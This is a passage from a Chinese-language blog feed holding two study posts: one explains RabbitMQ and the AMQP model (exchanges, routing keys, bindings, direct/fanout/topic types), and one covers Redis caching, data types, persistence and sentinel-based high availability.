<p>如果想更详细，更深入了解 Docker，推荐 &gt;&gt;&gt; <a href="https://www.cnblogs.com/codelove/p/10030439.html" target="_blank" rel="noopener">Docker 最全教程——从理论到实战（一）</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RabbitMQ 知识点]]></title>
      <url>/2019/12/19/RabbitMQKnowledgePoints/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://mp.weixin.qq.com/s/r8k1TN46Pk61qTjZ8ljsEQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/r8k1TN46Pk61qTjZ8ljsEQ</a></p>
</blockquote>
<a id="more"></a>

<p>&emsp;&emsp;目前，主流的消息中间件主要有：ActiveMQ、Kafka、RabbitMQ、RocketMQ 等等……而我们今天的主角是：RabbitMQ。RabbitMQ 是开源基于 erlang 语言开发，具有高可用高并发的优点，适合集群消息代理和队列服务器，它是基于 AMQP 协议来实现的。AMQP 的主要特征是面向消息、队列、路由（包括点对点和发布/订阅）、可靠性、安全。RabbitMQ 支持多种语言，有消息确认机制和持久化机制，保证数据不丢失的前提做到可靠性、可用性。</p>
<h1 id="消息与消息队列"><a href="#消息与消息队列" class="headerlink" title="消息与消息队列"></a>消息与消息队列</h1><p>&emsp;&emsp;消息（Message）是指应用于应用之间传送的数据，消息的类型包括文本字符串、JSON、XML、内嵌对象等等…<br>&emsp;&emsp;所谓 <strong>消息中间件 / 消息队列</strong>（Message Queue Middleware，简称 MQ）是利用高效可靠的消息传递机制进行数据交流，同时可以基于数据通信来进行分布式系统的继承。消息中间件一般有两种传递模式：<strong>点对点（Point-to-Point）模式</strong>和<strong>发布/订阅（Pub/Sub）模式</strong>。点对点模式是基于队列的，消息生产者发送消息到队列，消息消费者从队列中接收消息，队列的存在使得消息的异步传输成为了可能。发布订阅模式定义了如何向一个内容节点发布和订阅内容，这个内容节点叫 topic，这种模式可以满足消费者发布一个消息，多个消费者同时消费同一信息的需求。</p>
<figure class="image-box">
                <img src="1.webp" alt="性能对比" title class>
                <p>性能对比</p>
            </figure>

<h2 id="什么是-AMQP-协议？"><a href="#什么是-AMQP-协议？" class="headerlink" title="什么是 AMQP 协议？"></a>什么是 AMQP 协议？</h2><p>&emsp;&emsp;AMQP 的全称：Advanced Message Queuing Protocol（高级消息队列协议），它是消息队列的一个规范，其中定义了很多核心的概念，AMQP 与 JMS（Java Message Service）Java 平台的专业技术规范类似，同样提供了很多面向中间件的 API，用于两个应用程序之间，或者分布式系统之间的发送消息，进行异步通信。</p>
<h2 id="AMQP-的协议模型"><a href="#AMQP-的协议模型" class="headerlink" title="AMQP 的协议模型"></a>AMQP 的协议模型</h2><p>&emsp;&emsp;<strong>解释</strong>：Producer（生产者）将信息投递到 Server 端的 RabbitMQ 的 Exchange 中（过程：message -&gt; server -&gt; virtual host -&gt; RabbitMQ -&gt; Exchange），Consumer（消费者）只需要订阅消息队列 Message Queue，每当有消息投递到队列 queue 中时，都会通知消费者进行消费。</p>
<ul>
<li>生产者只需要将消息投递到 Exchange 交换机中，不需要关注消息被投递到哪个队列。</li>
<li>消费者只需要监听队列来消费消息，不需要关注消息来自于哪个 Exchange。</li>
<li>Exchange 和 Message Queue 存在着绑定的关系，一个 Exchage 可以绑定多个消息队列。</li>
</ul>
<figure class="image-box">
                <img src="2.webp" alt title class>
                <p></p>
            </figure>

<h2 id="AMQP-核心概念"><a href="#AMQP-核心概念" class="headerlink" title="AMQP 核心概念"></a>AMQP 核心概念</h2><ul>
<li><strong>Server</strong>：又称 Broker，接受客户端的连接，实现 AMQP 实体服务；</li>
<li><strong>Connection</strong>：连接，应用于程序与 Broker 的网络连接；</li>
<li><strong>Channel</strong>：网络通道，几乎所有的操作都是在 channel 中进行的，channel 是进行消息读写的通道，客户可以建立多个 channel，每个 channel 代表一个会话任务；</li>
<li><strong>Message</strong>：消息，服务器与应用程序之间传送的数据，由 Properties 和 Body 组成，Properties 可以对消息进行修饰，比如消息的优先级，延迟等高级特性，Body 是消息体内容；</li>
<li><strong>Virtual host</strong>：虚拟地址，用于进行逻辑隔离，最上层的消息路由，一个 Virtrual host 里面可以有若干个 Exchange 和 Queue，同一个 Virtrual host 里面不能有相同名字的 Exchange 或 Queue；</li>
<li><strong>Exchange</strong>：交换机，接收消息，根据路由键转发消息到绑定的队列；</li>
<li><strong>Routingkey</strong>：生产者架构消息发给交换器的时候，会指定一个 RoutingKey，用来置顶这个消息的路由规则，通过 RoutingKey 来决定消息流向哪里；</li>
<li><strong>Binding</strong>：绑定，RabbitMQ 中通过绑定将交换器跟队列关联起来，在绑定的时候会指定一个绑定键（BindingKey），这样 RabbitMQ 就知道如何正确地将消息路由到对应的队列中去了，也就是生产者将信息发送给交换器时，需要一个 RoutingKey，当 RoutingKey 与 BindingKey 完全匹配时，消息会被路由到对应的队列中去；</li>
<li><strong>Queue</strong>：也叫 Message Queue，消息队列，保存消息并将他们转发给消费者；</li>
</ul>
<p>&emsp;&emsp;注意：对于初学者，交换器、路由键、绑定这几个概念理解起来比较晦涩，这里做个比喻：交换器相当于投递包裹的邮箱，RoutingKey 相当于填写在包裹上的地址，BindingKey 相当于包裹的目的地，当填写在包裹上的地址和实际想要投递的地址相匹配，那么这个包裹就会被投递到目的地，最后这个目的地的主人 “队列” 就可以保留这个包裹，如果对应的地址不匹配，也就是 RoutingKey 和 BindingKey 不匹配，邮递员就不能正确地投递到目的地，包裹可能会回退给寄件人，也可能被丢弃。  </p>
<h2 id="AMQP-消息路由"><a href="#AMQP-消息路由" class="headerlink" title="AMQP 消息路由"></a>AMQP 消息路由</h2><p>&emsp;&emsp;AMQP 中消息的路由过程和 JMS 存在一些差别。<strong>AMQP</strong> 中增加了 Exchange 和 Binding 的角色。生产者把消息发布到 Exchange 上，消息最终到达队列并被消费者接收，而 Binding 决定交换器的消息应该发送到哪个队列。</p>
<figure class="image-box">
                <img src="3.webp" alt title class>
                <p></p>
            </figure>

<h3 id="Exchange-类型"><a href="#Exchange-类型" class="headerlink" title="Exchange 类型"></a>Exchange 类型</h3><p>&emsp;&emsp;RabbitMQ 常用的交换器类型主要有四种：direct、fanout、topic、headers ，Exchange 分发消息时根据类型的不同分发策略有区别，headers 匹配 AMQP 消息的 header 而不是路由键，此外 headers 交换器和 direct 交换器完全一致，但性能差很多，目前几乎用不到了，这里仅仅对其他三种进行展开说明：  </p>
<h4 id="1-direct"><a href="#1-direct" class="headerlink" title="1. direct"></a>1. direct</h4><figure class="image-box">
                <img src="4.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;direct 类型的交换器理由规则需要遵循严格的完全匹配规则，他会把消息路由到那些 BindingKey 和 RoutingKey 完全匹配的队里中，如果消息中的路由键（RoutingKey）和 Binding 中的 BindingKey 一致， 交换器就将消息发到对应的队列中。比如：</p>
<figure class="image-box">
                <img src="5.webp" alt title class>
                <p></p>
            </figure>

<ul>
<li>在发送消息的时候设置路由键为 “info” 或者 “debug”，消息只会路由到 Queue2，如果以其他路由键发送消息，则消息不会路由到这两个队里中，这就是路由键和 Binding key 的完全匹配。</li>
</ul>
<p>&emsp;&emsp;direct 类型模式的特点：</p>
<ol>
<li>不需要将 Exchange 进行任何绑定（binding）操作</li>
<li>消息传递时需要一个 “RoutingKey”，可以简单的理解为要发送到的队列名字。</li>
<li>如果 vhost 中不存在 RoutingKey 中指定的队列名，则该消息会被抛弃。</li>
</ol>
<h4 id="2-fanout"><a href="#2-fanout" class="headerlink" title="2. fanout"></a>2. fanout</h4><figure class="image-box">
                <img src="6.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;<strong>它会将所有发送到该交换器的消息路由到所有与该交换器绑定的队列中。</strong>fanout 交换器不处理路由键，只是简单的将队列绑定到交换器上，每个发送到交换器的消息都会被转发到与该交换器绑定的所有队列上。就像子网广播，每台子网内的主机都获得了一份复制的消息。fanout 类型转发消息是最快的。  </p>
<p>&emsp;&emsp;这种模式的特点：</p>
<ol>
<li>不需要 RoutingKey，我们将路由键设置为空即可。</li>
<li>需要提前将 Exchange 和 Queue 进行绑定，一个 Exchange 可以绑定多个 Queue，一个 Queue 可以同时与多个 Exchange 进行绑定（”多对多关系”）。</li>
<li>如果接受到消息的 Exchange 没有与任何 Queue 绑定，则消息会被抛弃。</li>
</ol>
<h4 id="3-topic"><a href="#3-topic" class="headerlink" title="3. topic"></a>3. topic</h4><figure class="image-box">
                <img src="7.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;direct 类型的交换器理由规则需要遵循严格的完全匹配规则，这种严格的匹配方式有时候不能满足实际的业务需求，topic 就是在这种规则上进行了扩展，topic 交换器通过模式匹配分配消息的路由键属性，将路由键和某个模式进行匹配，但是这里的匹配规则有所不同，它的约定如下：</p>
<ul>
<li>RoutingKey 为一个点号 “.” 分隔的字符串（被点号 “.” 号分隔开的一段独立的字符串称为单词），比如：”com.rabbit.client”、”java.util.Map”;</li>
<li>BindingKey 和 RoutingKey 为一个点号 “.” 分隔的字符串；</li>
<li>BindingKey 中可以存在两种特殊的字符串 “*“ 和 “#“，用于做模糊匹配，其中 “*“ 用于匹配一个单词， “#“ 用于匹配多规则单词；<ul>
<li>“com.#” 可以匹配到 com.rabbitmq.aaa</li>
<li>“com.*” 可以匹配到 com.rabbitmq</li>
</ul>
</li>
</ul>
<p>&emsp;&emsp;<strong>举个实例</strong>：</p>
<figure class="image-box">
                <img src="8.webp" alt title class>
                <p></p>
            </figure>
<ul>
<li>路由键为 “com.rabbitmq.client” 的消息会同时路由到 Queue1 和 Queue2</li>
<li>路由键为 “com.hidden.client” 的消息只会路由到 Queue2</li>
<li>路由键为 “com.hidden.data” 的消息只会路由到 Queue2</li>
<li>路由键为 “java.rabbitmq.data” 的消息只会路由到 Queue1</li>
<li>路由键为 “java.util.map” 的消息将会被丢弃或者返回给生产者，因为它没有匹配任何的路由键。</li>
</ul>
<h2 id="RabbitMQ-特点"><a href="#RabbitMQ-特点" class="headerlink" title="RabbitMQ 特点"></a>RabbitMQ 特点</h2><p>&emsp;&emsp;RabbitMQ 最初起源于金融系统，用于在分布式系统中存储转发消息，在易用性、扩展性、高可用性等方面表现不俗。具体特点包括：</p>
<ol>
<li>可靠性<br>RabbitMQ 使用一些机制来保证可靠性，如持久化、传输确认、发布确认。</li>
<li>灵活的路由（Flexible Routing）<br>在消息进入队列之前，通过 Exchange 来路由消息。对于典型的路由功能，RabbitMQ 已经提供了一些内置的 Exchange 来实现。针对更复杂的路由功能，可以将多个 Exchange 绑定在一起，也可以通过插件机制实现自己的 Exchange。</li>
<li>消息集群（Clustering）<br>多个 RabbitMQ 服务器可以组成一个集群，形成一个逻辑 Broker 。</li>
<li>高可用<br>队列可以在集群中的机器上进行镜像，使得在部分节点出问题的情况下队列仍然可用。</li>
<li>多种协议（Multi-protocol）<br>RabbitMQ 支持多种消息队列协议，比如 STOMP、MQTT 等等。</li>
<li>多语言客户端<br>RabbitMQ 几乎支持所有常用语言，比如 Java、.NET、Ruby 等等。</li>
<li>管理界面<br>RabbitMQ 提供了一个易用的用户界面，使得用户可以监控和管理消息 Broker 的许多方面。</li>
<li>跟踪机制<br>如果消息异常，RabbitMQ 提供了消息跟踪机制，使用者可以找出发生了什么。</li>
<li>插件机制<br>RabbitMQ 提供了许多插件，来从多方面进行扩展，也可以编写自己的插件。</li>
</ol>
<h1 id="RabbitMQ-中的概念模型"><a href="#RabbitMQ-中的概念模型" class="headerlink" title="RabbitMQ 中的概念模型"></a>RabbitMQ 中的概念模型</h1><h2 id="消息模型"><a href="#消息模型" class="headerlink" title="消息模型"></a>消息模型</h2><p>&emsp;&emsp;所有 MQ 产品从模型抽象上来说都是一样的过程：<br>&emsp;&emsp;消费者（consumer）订阅某个队列。生产者（producer）创建消息，然后发布到队列（queue）中，最后将消息发送到监听的消费者。</p>
<figure class="image-box">
                <img src="9.webp" alt="消息流" title class>
                <p>消息流</p>
            </figure>

<h2 id="RabbitMQ-基本概念"><a href="#RabbitMQ-基本概念" class="headerlink" title="RabbitMQ 基本概念"></a>RabbitMQ 基本概念</h2><p>&emsp;&emsp;上面只是最简单抽象的描述，具体到 RabbitMQ 则有更详细的概念需要解释。上面介绍过 RabbitMQ 是 AMQP 协议的一个开源实现，所以其内部实际上也是 AMQP 中的基本概念：</p>
<figure class="image-box">
                <img src="10.webp" alt="RabbitMQ 内部结构" title class>
                <p>RabbitMQ 内部结构</p>
            </figure>

<h2 id="RabbitMQ-的作用和使用场景"><a href="#RabbitMQ-的作用和使用场景" class="headerlink" title="RabbitMQ 的作用和使用场景"></a>RabbitMQ 的作用和使用场景</h2><figure class="image-box">
                <img src="11.webp" alt title class>
                <p></p>
            </figure>

<h2 id="RabbitMQ-的核心组件"><a href="#RabbitMQ-的核心组件" class="headerlink" title="RabbitMQ 的核心组件"></a>RabbitMQ 的核心组件</h2><figure class="image-box">
                <img src="12.webp" alt title class>
                <p></p>
            </figure>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> RabbitMQ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Redis 知识点]]></title>
      <url>/2019/12/19/RedisKnowledgePoints/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://juejin.im/post/5dcaebea518825571f5c4ab0" target="_blank" rel="noopener">https://juejin.im/post/5dcaebea518825571f5c4ab0</a></p>
</blockquote>
<a id="more"></a>

<figure class="image-box">
                <img src="Redis.jpg" alt title class>
                <p></p>
            </figure>

<h1 id="缓存知识点"><a href="#缓存知识点" class="headerlink" title="缓存知识点"></a>缓存知识点</h1><figure class="image-box">
                <img src="16e62e9b721e11c3.png" alt title class>
                <p></p>
            </figure>

<h2 id="缓存有哪些类型？"><a href="#缓存有哪些类型？" class="headerlink" title="缓存有哪些类型？"></a>缓存有哪些类型？</h2><p>&emsp;&emsp;缓存是高并发场景下提高热点数据访问性能的一个有效手段，在开发项目时会经常使用到。<br>&emsp;&emsp;缓存的类型分为：<strong>本地缓存</strong>、<strong>分布式缓存</strong>和<strong>多级缓存</strong>。  </p>
<h3 id="本地缓存："><a href="#本地缓存：" class="headerlink" title="本地缓存："></a>本地缓存：</h3><p>&emsp;&emsp;<strong>本地缓存</strong>就是在进程的内存中进行缓存，比如我们的 <code>JVM</code> 堆中，可以用 <code>LRUMap</code> 来实现，也可以使用 <code>Ehcache</code> 这样的工具来实现。<br>&emsp;&emsp;本地缓存是内存访问，没有远程交互开销，性能最好，但是受限于单机容量，一般缓存较小且无法扩展。  </p>
<h3 id="分布式缓存："><a href="#分布式缓存：" class="headerlink" title="分布式缓存："></a>分布式缓存：</h3><p>&emsp;&emsp;<strong>分布式缓存</strong>可以很好地解决这个问题。<br>&emsp;&emsp;分布式缓存一般都具有良好的水平扩展能力，对较大数据量的场景也能应付自如。缺点就是需要进行远程请求，性能不如本地缓存。  </p>
<h3 id="多级缓存："><a href="#多级缓存：" class="headerlink" title="多级缓存："></a>多级缓存：</h3><p>&emsp;&emsp;为了平衡这种情况，实际业务中一般采用<strong>多级缓存</strong>，本地缓存只保存访问频率最高的部分热点数据，其他的热点数据放在分布式缓存中。<br>&emsp;&emsp;在目前的一线大厂中，这也是最常用的缓存方案，单靠单一的缓存方案往往难以撑住很多高并发的场景。  </p>
<h2 id="淘汰策略"><a href="#淘汰策略" class="headerlink" title="淘汰策略"></a>淘汰策略</h2><p>&emsp;&emsp;不管是本地缓存还是分布式缓存，为了保证较高性能，都是使用内存来保存数据，由于成本和内存限制，当存储的数据超过缓存容量时，需要对缓存的数据进行剔除。  </p>
<p>&emsp;&emsp;一般的剔除策略有 <strong>FIFO</strong> 淘汰最早数据、<strong>LRU</strong> 剔除最近最少使用、和 <strong>LFU</strong> 剔除最近使用频率最低的数据几种策略。</p>
<ul>
<li><strong>noeviction</strong>: 返回错误当内存限制达到并且客户端尝试执行会让更多内存被使用的命令（大部分的写入指令，但 DEL 和几个例外）</li>
<li><strong>allkeys-lru</strong>: 尝试回收最少使用的键（LRU），使得新添加的数据有空间存放。</li>
<li><strong>volatile-lru</strong>: 尝试回收最少使用的键（LRU），但仅限于在过期集合的键,使得新添加的数据有空间存放。</li>
<li><strong>allkeys-random</strong>: 回收随机的键使得新添加的数据有空间存放。</li>
<li><strong>volatile-random</strong>: 回收随机的键使得新添加的数据有空间存放，但仅限于在过期集合的键。</li>
<li><strong>volatile-ttl</strong>: 回收在过期集合的键，并且优先回收存活时间（TTL）较短的键,使得新添加的数据有空间存放。</li>
</ul>
<p>&emsp;&emsp;如果没有键满足回收的前提条件的话，策略 <strong>volatile-lru</strong>, <strong>volatile-random</strong> 以及 <strong>volatile-ttl</strong> 就和 <strong>noeviction</strong> 差不多了。  </p>
<h2 id="Memcache"><a href="#Memcache" class="headerlink" title="Memcache"></a>Memcache</h2><p>&emsp;&emsp;注意后面会把 <strong>Memcache</strong> 简称为 MC。  </p>
<p>&emsp;&emsp;先来看看 MC 的特点：</p>
<ul>
<li>MC 处理请求时使用多线程异步 I/O 的方式，可以合理利用 CPU 多核的优势，性能非常优秀；</li>
<li>MC 功能简单，使用内存存储数据；</li>
<li>MC 的内存结构以及钙化问题我就不细说了，大家可以查看<a href="http://www.memcached.org/about" target="_blank" rel="noopener">官网</a>了解下；</li>
<li>MC 对缓存的数据可以设置失效期，过期后的数据会被清除；</li>
<li>失效的策略采用延迟失效，就是当再次使用数据时检查是否失效；</li>
<li>当容量存满时，会对缓存中的数据进行剔除，剔除时除了会对过期 key 进行清理，还会按 LRU 策略对数据进行剔除。</li>
</ul>
<p>&emsp;&emsp;另外，使用 MC 有一些限制，这些限制在现在的互联网场景下很致命，成为大家选择 <strong>Redis</strong>、<strong>MongoDB</strong> 的重要原因：</p>
<ul>
<li>key 不能超过 250 个字节；</li>
<li>value 不能超过 1M 字节；</li>
<li>key 的最大失效时间是 30 天；</li>
<li>只支持 K-V 结构，不提供持久化和主从同步功能。</li>
</ul>
<h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>&emsp;&emsp;先简单说一下 <strong>Redis</strong> 的特点，方便和 MC 比较。</p>
<ul>
<li>与 MC 不同的是，Redis 采用单线程模式处理请求。这样做的原因有 2 个：一个是因为采用了非阻塞的异步事件处理机制；另一个是缓存数据都是内存操作 I/O 时间不会太长，单线程可以避免线程上下文切换产生的代价。</li>
<li><strong>Redis</strong> 支持持久化，所以 Redis 不仅仅可以用作缓存，也可以用作 NoSQL 数据库。</li>
<li>相比 MC，<strong>Redis</strong> 还有一个非常大的优势，就是除了 K-V 之外，还支持多种数据格式，例如 list、set、sorted set、hash 等。</li>
<li><strong>Redis</strong> 提供主从同步机制，以及 <strong>Cluster</strong> 集群部署能力，能够提供高可用服务。</li>
</ul>
<h1 id="详解-Redis"><a href="#详解-Redis" class="headerlink" title="详解 Redis"></a>详解 Redis</h1><p>&emsp;&emsp;Redis 的知识点结构如下图所示。</p>
<figure class="image-box">
                <img src="16e62e9b727cc6fb.png" alt title class>
                <p></p>
            </figure>

<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>&emsp;&emsp;来看 <strong>Redis</strong> 提供的功能有哪些吧！  </p>
<h3 id="我们先看基础类型："><a href="#我们先看基础类型：" class="headerlink" title="我们先看基础类型："></a>我们先看基础类型：</h3><h4 id="String："><a href="#String：" class="headerlink" title="String："></a>String：</h4><p>&emsp;&emsp;<strong>String</strong> 类型是 <strong>Redis</strong> 中最常使用的类型，内部的实现是通过 <strong>SDS</strong>（Simple Dynamic String）来存储的。SDS 类似于 <code>Java</code> 中的 <code>ArrayList</code>，可以通过预分配冗余空间的方式来减少内存的频繁分配。<br>&emsp;&emsp;这是最简单的类型，就是普通的 set 和 get，做简单的 KV 缓存。  </p>
<p>&emsp;&emsp;String 的实际应用场景比较广泛的有：</p>
<ul>
<li><strong>缓存功能</strong>：<strong>String</strong> 字符串是最常用的数据类型，不仅仅是 <strong>Redis</strong>，各个语言都是最基本类型，因此，利用 <strong>Redis</strong> 作为缓存，配合其它数据库作为存储层，利用 <strong>Redis</strong> 支持高并发的特点，可以大大加快系统的读写速度、以及降低后端数据库的压力。</li>
<li><strong>计数器</strong>：许多系统都会使用 <strong>Redis</strong> 作为系统的实时计数器，可以快速实现计数和查询的功能。而且最终的数据结果可以按照特定的时间落地到数据库或者其它存储介质当中进行永久保存。</li>
<li><strong>共享用户 Session</strong>：用户重新刷新一次界面，可能需要访问一下数据进行重新登录，或者访问页面缓存 <strong>Cookie</strong>，但是可以利用 <strong>Redis</strong> 将用户的 <strong>Session</strong> 集中管理，在这种模式只需要保证 <strong>Redis</strong> 的高可用，每次用户 <strong>Session</strong> 的更新和获取都可以快速完成。大大提高效率。</li>
</ul>
<h4 id="Hash："><a href="#Hash：" class="headerlink" title="Hash："></a>Hash：</h4><p>&emsp;&emsp;这个是类似 <strong>Map</strong> 的一种结构，这个一般就是可以将结构化的数据，比如一个对象（前提是<strong>这个对象没嵌套其他的对象</strong>）给缓存在 <strong>Redis</strong> 里，然后每次读写缓存的时候，可以就操作 <strong>Hash</strong> 里的<strong>某个字段</strong>。<br>&emsp;&emsp;但是这个的场景其实还是多少单一了一些，因为现在很多对象都是比较复杂的，比如你的商品对象可能里面就包含了很多属性，其中也有对象。我自己使用的场景用得不是那么多。  </p>
<h4 id="List："><a href="#List：" class="headerlink" title="List："></a>List：</h4><p>&emsp;&emsp;<strong>List</strong> 是有序列表，这个还是可以玩儿出很多花样的。<br>&emsp;&emsp;比如可以通过 <strong>List</strong> 存储一些列表型的数据结构，类似粉丝列表、文章的评论列表之类的东西。<br>&emsp;&emsp;比如可以通过 <code>lrange</code> 命令，读取某个闭区间内的元素，可以基于 <strong>List</strong> 实现分页查询，这个是很棒的一个功能，基于 <strong>Redis</strong> 实现简单的高性能分页，可以做类似微博那种下拉不断分页的东西，性能高，就一页一页走。<br>&emsp;&emsp;比如可以搞个简单的消息队列，从 <strong>List</strong> 头怼进去，从 <strong>List</strong> 屁股那里弄出来。  </p>
<p>&emsp;&emsp;<strong>List</strong> 本身就是我们在开发过程中比较常用的数据结构了，热点数据更不用说了。</p>
<ul>
<li><strong>消息队列</strong>：<strong>Redis</strong>的链表结构，可以轻松实现阻塞队列，可以使用左进右出的命令组成来完成队列的设计。比如：数据的生产者可以通过 <code>Lpush</code> 命令从左边插入数据，多个数据消费者，可以使用 <code>BRpop</code> 命令阻塞的“抢”列表尾部的数据。</li>
<li>文章列表或者数据分页展示的应用。<br>比如，我们常用的博客网站的文章列表，当用户量越来越多时，而且每一个用户都有自己的文章列表，而且当文章多时，都需要分页展示，这时可以考虑使用 <strong>Redis</strong> 的列表，列表不但有序同时还支持按照范围内获取元素，可以完美解决分页查询功能。大大提高查询效率。</li>
</ul>
<h4 id="Set："><a href="#Set：" class="headerlink" title="Set："></a>Set：</h4><p>&emsp;&emsp;<strong>Set</strong> 是无序集合，会自动去重的那种。<br>&emsp;&emsp;直接基于 <strong>Set</strong> 将系统里需要去重的数据扔进去，自动就给去重了，如果你需要对一些数据进行快速的全局去重，你当然也可以基于 <code>JVM</code> 内存里的 <code>HashSet</code> 进行去重，但是如果你的某个系统部署在多台机器上呢？得基于 <strong>Redis</strong> 进行全局的 <strong>Set</strong> 去重。<br>&emsp;&emsp;可以基于 <strong>Set</strong> 玩儿交集、并集、差集的操作，比如交集吧，我们可以把两个人的好友列表整一个交集，看看俩人的共同好友是谁？对吧。<br>&emsp;&emsp;反正这些场景比较多，因为对比很快，操作也简单，两个查询一个 <strong>Set</strong> 搞定。  </p>
<h4 id="Sorted-Set："><a href="#Sorted-Set：" class="headerlink" title="Sorted Set："></a>Sorted Set：</h4><p>&emsp;&emsp;<strong>Sorted Set</strong> 是排序的 <strong>Set</strong>，去重但可以排序，写进去的时候给一个分数，自动根据分数排序。  </p>
<p>&emsp;&emsp;有序集合的使用场景与集合类似，但是set集合不是自动有序的，而 <strong>Sorted Set</strong> 可以利用分数进行成员间的排序，而且是插入时就排序好。所以当你需要一个有序且不重复的集合列表时，就可以选择 <strong>Sorted Set</strong> 数据结构作为选择方案。</p>
<ul>
<li>排行榜：有序集合经典使用场景。例如视频网站需要对用户上传的视频做排行榜，榜单维护可能是多方面：按照时间、按照播放量、按照获得的赞数等。</li>
<li>用 <strong>Sorted Set</strong> 来做带权重的队列，比如普通消息的 score 为 1，重要消息的 score 为 2，然后工作线程可以选择按 score 的倒序来获取工作任务。让重要的任务优先执行。<br>微博热搜榜，就是有个后面的热度值，前面就是名称。</li>
</ul>
<h3 id="高级用法："><a href="#高级用法：" class="headerlink" title="高级用法："></a>高级用法：</h3><h4 id="Bitmap"><a href="#Bitmap" class="headerlink" title="Bitmap:"></a>Bitmap:</h4><p>&emsp;&emsp;位图是支持按 bit 位来存储信息，可以用来实现 <strong>布隆过滤器（BloomFilter）</strong>；  </p>
<h4 id="HyperLogLog"><a href="#HyperLogLog" class="headerlink" title="HyperLogLog:"></a>HyperLogLog:</h4><p>&emsp;&emsp;供不精确的去重计数功能，比较适合用来做大规模数据的去重统计，例如统计 UV；  </p>
<h4 id="Geospatial"><a href="#Geospatial" class="headerlink" title="Geospatial:"></a>Geospatial:</h4><p>&emsp;&emsp;可以用来保存地理位置，并作位置距离计算或者根据半径计算位置等。有没有想过用 Redis 来实现附近的人？或者计算最优地图路径？  </p>
<h4 id="pub-sub："><a href="#pub-sub：" class="headerlink" title="pub/sub："></a>pub/sub：</h4><p>&emsp;&emsp;功能是订阅发布功能，可以用作简单的消息队列。  </p>
<h4 id="Pipeline："><a href="#Pipeline：" class="headerlink" title="Pipeline："></a>Pipeline：</h4><p>&emsp;&emsp;可以批量执行一组指令，一次性返回全部结果，可以减少频繁的请求应答。  </p>
<h4 id="Lua："><a href="#Lua：" class="headerlink" title="Lua："></a>Lua：</h4><p>&emsp;&emsp;<strong>Redis</strong> 支持提交 <strong>Lua</strong> 脚本来执行一系列的功能。  </p>
<h4 id="事务："><a href="#事务：" class="headerlink" title="事务："></a>事务：</h4><p>&emsp;&emsp;最后一个功能是事务，但 <strong>Redis</strong> 提供的不是严格的事务，<strong>Redis</strong> 只保证串行执行命令，并且能保证全部执行，但是执行命令失败时并不会回滚，而是会继续执行下去。  </p>
<h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><p>&emsp;&emsp;<strong>Redis</strong> 提供了 RDB 和 AOF 两种持久化方式，RDB 是把内存中的数据集以快照形式写入磁盘，实际操作是通过 fork 子进程执行，采用二进制压缩存储；AOF 是以文本日志的形式记录 <strong>Redis</strong> 处理的每一个写入或删除操作。<br>&emsp;&emsp;<strong>RDB</strong> 把整个 Redis 的数据保存在单一文件中，比较适合用来做灾备，但缺点是快照保存完成之前如果宕机，这段时间的数据将会丢失，另外保存快照时可能导致服务短时间不可用。<br>&emsp;&emsp;<strong>AOF</strong> 对日志文件的写入操作使用的追加模式，有灵活的同步策略，支持每秒同步、每次修改同步和不同步，缺点就是相同规模的数据集，AOF 要大于 RDB，AOF 在运行效率上往往会慢于 RDB。  </p>
<h2 id="高可用"><a href="#高可用" class="headerlink" title="高可用"></a>高可用</h2><p>&emsp;&emsp;来看 Redis 的高可用。Redis 支持主从同步，提供 Cluster 集群部署模式，通过 Sentinel 哨兵来监控 Redis 主服务器的状态。当主挂掉时，在从节点中根据一定策略选出新主，并调整其他从 slaveof 到新主。  </p>
<p>&emsp;&emsp;选主的策略简单来说有三个：</p>
<ul>
<li>slave 的 priority 设置的越低，优先级越高；</li>
<li>同等情况下，slave 复制的数据越多优先级越高；</li>
<li>相同的条件下 runid 越小越容易被选中。</li>
</ul>
<p>&emsp;&emsp;在 Redis 集群中，sentinel 也会进行多实例部署，sentinel 之间通过 Raft 协议来保证自身的高可用。<br>&emsp;&emsp;Redis Cluster 使用分片机制，在内部分为 16384 个 slot 插槽，分布在所有 master 节点上，每个 master 节点负责一部分 slot。数据操作时按 key 做 CRC16 来计算在哪个 slot，由哪个 master 进行处理。数据的冗余是通过 slave 节点来保障。  </p>
<h2 id="哨兵"><a href="#哨兵" class="headerlink" title="哨兵"></a>哨兵</h2><p>&emsp;&emsp;哨兵必须用三个实例去保证自己的健壮性的，哨兵 + 主从并<strong>不能保证数据不丢失</strong>，但是可以保证集群的<strong>高可用</strong>。<br>&emsp;&emsp;为啥必须要三个实例呢？我们先看看两个哨兵会咋样。</p>
<figure class="image-box">
                <img src="16e43d17b9133099.jpg" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;master 宕机了 s1 和 s2 两个哨兵只要有一个认为你宕机了就切换了，并且会选举出一个哨兵去执行故障，但是这个时候也需要大多数哨兵都是运行的。<br>&emsp;&emsp;那这样有啥问题呢？M1 宕机了，S1 没挂那其实是 OK 的，但是整个机器都挂了呢？哨兵就只剩下 S2 个裸屌了，没有哨兵去允许故障转移了，虽然另外一个机器上还有 R1，但是故障转移就是不执行。<br>&emsp;&emsp;经典的哨兵集群是这样的：</p>
<figure class="image-box">
                <img src="16e43d17ba5878cb.jpg" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;M1 所在的机器挂了，哨兵还有两个，两个人一看他不是挂了嘛，那我们就选举一个出来执行故障转移不就好了。  </p>
<p>&emsp;&emsp;暖男我，小的总结下哨兵组件的主要功能：</p>
<ul>
<li>集群监控：负责监控 Redis master 和 slave 进程是否正常工作。</li>
<li>消息通知：如果某个 <strong>Redis</strong> 实例有故障，那么哨兵负责发送消息作为报警通知给管理员。</li>
<li>故障转移：如果 master node 挂掉了，会自动转移到 slave node 上。</li>
